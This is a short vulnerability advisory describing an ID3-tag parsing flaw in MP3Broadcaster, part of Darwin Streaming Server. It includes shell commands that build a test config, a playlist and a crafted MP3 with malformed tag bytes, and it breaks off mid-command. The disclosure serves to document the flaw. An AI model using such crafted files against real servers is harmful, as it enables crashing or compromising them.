MP3Broadcaster is shipped as part of Darwin Streaming Server software.

MP3Broadcaster has been reported prone to a vulnerability when processing malicious ID3 tags. This is likely due to insufficient sanity checks performed when handling signed integer values contained within MP3 file ID3 tags.

First create the sample configuration file:
$ echo -e "\n" > test.conf

Then create a playlist file:
$ echo -e "*PLAY-LIST*\nsong.mp3" > mp3playlist.ply

Create a specially crafted mp3 file:
$ echo -e
"ID3\x03\x00\x00\x00\x00\x0f\x0fTPE1\xff\xaa\xaa\xbb\x00\x00\x00\x00\x00\x00
